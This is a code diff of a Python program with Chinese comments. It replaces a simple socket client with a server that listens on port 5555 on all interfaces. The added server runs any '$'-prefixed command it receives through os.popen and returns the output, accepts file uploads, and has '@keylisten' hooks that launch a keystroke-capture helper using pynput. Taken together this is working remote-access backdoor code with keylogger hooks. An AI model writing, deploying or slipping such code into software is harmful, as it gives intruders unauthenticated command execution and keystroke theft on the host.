@@ -1,42 +1,75 @@
-import socket,os,struct
- 
-# 实例化
-sk = socket.socket()
-# 定义连接的ip和port
-server_ip = input("请输入目标ip")
-if server_ip=="":
-    server_ip='127.0.0.1'
 
-# 连接到服务器
-sk.connect((server_ip, 5555))
- 
-while True:
-    send_msg = input("请输入要发送给服务端的消息：")
-    if send_msg == "":
-        send_msg="hi"
-    # 发送消息
-    if  "upload" in send_msg:
-        send_file=send_msg.replace("@upload ","")
-        print("you try upload file--->"+send_file)
-        if os.path.isfile(send_file):
-                    # 定义文件头信息，包含文件名和文件大小
-                    #fhead_msg = struct.pack(str(len(send_file))+"s", os.path.basename(send_file).encode("utf-8"))
-                    sk.send(send_msg.encode("UTF-8"))
-                    if sk.recv(4)==b'ok':
-                        print("start send")
-                        sk.send(str(os.stat(send_file).st_size).encode("UTF-8"))
-                        fp = open(send_file, 'rb')
-                        while 1:
-                            data = fp.read(1024)
-                            if not data and sk.recv(1024)==b'success':
-                                print("send succes")
-                                break
-                            sk.send(data)
+import socket
+import os,time,struct
+from pynput.keyboard import Key, Controller,Listener
+ip = ""  # 空表示可连接所有主机
+port = 5555  # 设置端口
+from threading import Thread
 
-    sk.send(send_msg.encode("UTF-8"))
-    # 接受消息
-    recv_data = sk.recv(1024).decode("gbk")    # 1024是缓冲区大小，一般就填1024， recv是阻塞式
-    print(f"服务端回复的消息是：{recv_data}")
- 
-# 关闭连接
-sk.close()
+
+def run_extend(exename):
+    os.popen(exename)
+
+while 1:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 对象s 使用基于tcp协议的网络套接字
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 关闭后不需要保存状态可以立即开启
+    s.bind((ip, port))  # 对象s 开始绑定ip和端口
+    s.listen(10)  # 启动监听状态，设置队列中等待连接服务器的最大请求数10
+    conn, addr = s.accept()
+    print("新的连接：",addr)
+    while True:
+        cmd=[]
+        data2="无效命令\n"
+        try:
+            data = conn.recv(1024)  # 接收对方字符串 #如果对方不发数据会卡住
+            print(data)
+            data = str(data, encoding="utf-8")
+            if len(data)<=0 or data=="\n" or data=="\r" or data=="":
+                print("对方发送了空数据")
+                data2="你发送了空数据"
+            
+            elif (data[0]=="$"):
+                data=data.replace("$","")
+                f = os.popen(data)  # 可以将命令的内容以读取的方式返回
+                data2 = f.read()
+                conn.send(bytes(data2, encoding="gbk"))
+            elif(data[0]=="@"):
+                data=data.replace("@","")
+                if data=="keylisten": 
+                    run_extend("key")
+                if data=="del_keylisten": 
+                    run_extend("key")
+                if "upload" in data:
+                        conn.send(bytes("ok", encoding="gbk"))
+                        recv_file=data.replace("upload ","")
+                        print("recv file<----"+recv_file)
+                        recvd_size = 0  # 定义已接收文件的大小
+                        fp = open(recv_file.replace("txt","upload"), 'ab')
+                        file_size=int(conn.recv(1024))
+                        print("recv size:",file_size)
+                        while not recvd_size == file_size:
+                            if file_size - recvd_size > 1024:
+                                data = conn.recv(1024)
+                                recvd_size += len(data)
+                            else:
+                                data = conn.recv(file_size - recvd_size)
+                                recvd_size = file_size
+                            fp.write(data)
+                        fp.close()
+                        print("sucess")
+                        conn.send(bytes("success", encoding="gbk"))
+
+            else:
+                conn.send(bytes(data2, encoding="gbk"))
+            #print(data2)
+              # 发送命令运行结果
+        except ConnectionResetError:
+            print("远程主机强迫关闭了一个现有的连接。")
+            time.sleep(1)
+            break
+        except OSError:
+            print("OSError: [WinError 10038] 在一个非套接字上尝试了一个操作。")
+            time.sleep(1)
+            break
+    conn.close()  # 断开连接
+    s.close()  # 关闭套结字
